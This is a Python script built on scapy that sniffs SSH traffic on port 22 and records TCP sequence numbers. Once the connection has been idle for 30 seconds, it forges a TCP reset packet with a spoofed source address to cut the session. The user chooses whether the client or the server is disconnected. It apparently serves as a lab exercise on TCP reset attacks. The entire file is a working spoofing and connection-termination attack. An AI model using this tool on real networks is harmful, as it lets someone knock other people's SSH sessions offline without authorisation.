import time
import threading
import sys
from scapy.all import *

# --- Global State ---
# Stores connection details: {src_ip, src_port, dst_ip, dst_port, seq, ack}
current_conn = {}
last_activity_time = 0
is_stabilized = False
stop_threads = False
target_option = ""  # 'C' for Client or 'S' for Server

# Lock for thread-safe variable access
lock = threading.Lock()

def print_headers(packet):
    """
    Displays IP and TCP header fields if the packet has no payload.
    """
    if IP in packet and TCP in packet:
        # Check if there is a Raw payload (Application Layer Data)
        if not packet.haslayer(Raw):
            print(f"\n[+] Control Packet Detected ({packet[IP].src} -> {packet[IP].dst})")
            print("    [IP Header]")
            print(f"       Version: {packet[IP].version}, IHL: {packet[IP].ihl}, TOS: {packet[IP].tos}")
            print(f"       Len: {packet[IP].len}, ID: {packet[IP].id}, Flags: {packet[IP].flags}")
            print(f"       TTL: {packet[IP].ttl}, Proto: {packet[IP].proto}, Chksum: {packet[IP].chksum}")
            
            print("    [TCP Header]")
            print(f"       Sport: {packet[TCP].sport}, Dport: {packet[TCP].dport}")
            print(f"       Seq: {packet[TCP].seq}, Ack: {packet[TCP].ack}")
            print(f"       Data Ofs: {packet[TCP].dataofs}, Flags: {packet[TCP].flags}")
            print(f"       Window: {packet[TCP].window}, Chksum: {packet[TCP].chksum}, UrgPtr: {packet[TCP].urgptr}")
            print("-" * 60)

def packet_callback(packet):
    """
    Callback function for every packet captured by the sniffer.
    """
    global last_activity_time, current_conn, is_stabilized
    
    if IP in packet and TCP in packet:
        with lock:
            # Update the last activity time whenever a packet is seen on Port 22
            last_activity_time = time.time()
            
            # If we are already stabilized, a new packet resets the status
            if is_stabilized:
                print(f"\n[!] New activity detected! Resetting stabilization timer...")
                is_stabilized = False

            # Capture connection details (Sequence/Ack numbers are vital for the attack)
            # We track the FLOW. We assume the 'Client' is the one initiating to port 22.
            if packet[TCP].dport == 22: # Client -> Server
                current_conn = {
                    'client_ip': packet[IP].src,
                    'client_port': packet[TCP].sport,
                    'server_ip': packet[IP].dst,
                    'server_port': packet[TCP].dport,
                    'next_seq': packet[TCP].seq + len(packet[TCP].payload), # Next expected SEQ by Server
                    'next_ack': packet[TCP].ack
                }
            elif packet[TCP].sport == 22: # Server -> Client
                current_conn = {
                    'client_ip': packet[IP].dst,
                    'client_port': packet[TCP].dport,
                    'server_ip': packet[IP].src,
                    'server_port': packet[TCP].sport,
                    'next_seq': packet[TCP].ack, 
                    'next_ack': packet[TCP].seq + len(packet[TCP].payload) # Next expected SEQ by Client
                }
            
            # Print headers if no data is present
            print_headers(packet)

def stabilization_monitor():
    """
    Monitors the time since the last packet. If > 30s, triggers termination.
    """
    global is_stabilized, stop_threads
    
    print("[*] Monitor thread started. Waiting for SSH connection...")
    
    while not stop_threads:
        time.sleep(1)
        with lock:
            # Wait until we have actually seen a packet
            if last_activity_time == 0:
                continue
                
            elapsed = time.time() - last_activity_time
            
            if elapsed >= 30 and not is_stabilized:
                print(f"\n[***] Connection Stabilized! (No data for 30s)")
                is_stabilized = True
                terminate_connection()
                stop_threads = True # Exit after termination
                sys.exit()

def terminate_connection():
    """
    Constructs and sends a TCP RST packet to terminate the connection.
    """
    print(f"\n[->] Initiating Termination Sequence against {target_option}...")
    
    if not current_conn:
        print("[!] No connection details available to terminate.")
        return

    # Packet Construction Variables
    src_ip = ""
    dst_ip = ""
    src_port = 0
    dst_port = 0
    seq_num = 0
    
    # LOGIC: To kill the connection, we spoof the *sender* to the *target*.
    if target_option == 'S': # Target Server -> Spoof Client
        print(f"[*] Targeting SERVER ({current_conn['server_ip']}). Spoofing Client.")
        src_ip = current_conn['client_ip']
        dst_ip = current_conn['server_ip']
        src_port = current_conn['client_port']
        dst_port = current_conn['server_port']
        # The SEQ number must match what the Server expects next
        seq_num = current_conn['next_seq']
        
    elif target_option == 'C': # Target Client -> Spoof Server
        print(f"[*] Targeting CLIENT ({current_conn['client_ip']}). Spoofing Server.")
        src_ip = current_conn['server_ip']
        dst_ip = current_conn['client_ip']
        src_port = current_conn['server_port']
        dst_port = current_conn['client_port']
        # The SEQ number must match what the Client expects next
        seq_num = current_conn['next_ack']

    # Create the RST packet
    # Flags="R" sends a TCP Reset
    ip_layer = IP(src=src_ip, dst=dst_ip)
    tcp_layer = TCP(sport=src_port, dport=dst_port, seq=seq_num, flags="R")
    pkt = ip_layer/tcp_layer
    
    print(f"[*] Sending RST Packet: {src_ip}:{src_port} -> {dst_ip}:{dst_port} | Seq: {seq_num}")
    send(pkt, verbose=0)
    print("[***] Termination Packet Sent. Connection should be closed.")

def main():
    global target_option, stop_threads
    
    print("--- SSH Connection Monitor & Terminator ---")
    target_option = input("Who do you want to disconnect? (S)erver or (C)lient: ").upper()
    
    if target_option not in ['S', 'C']:
        print("Invalid option. Exiting.")
        return

    # Start the Monitor Thread (Timer)
    monitor_thread = threading.Thread(target=stabilization_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Start Sniffing (Main Thread blocks here usually, but we filter specifically)
    print("[*] Sniffing for SSH traffic (TCP Port 22)...")
    try:
        # filter="tcp port 22" ensures we only look at SSH packets
        sniff(filter="tcp port 22", prn=packet_callback, store=0)
    except KeyboardInterrupt:
        stop_threads = True
        print("\n[!] Program stopped by user.")

if __name__ == "__main__":
    main()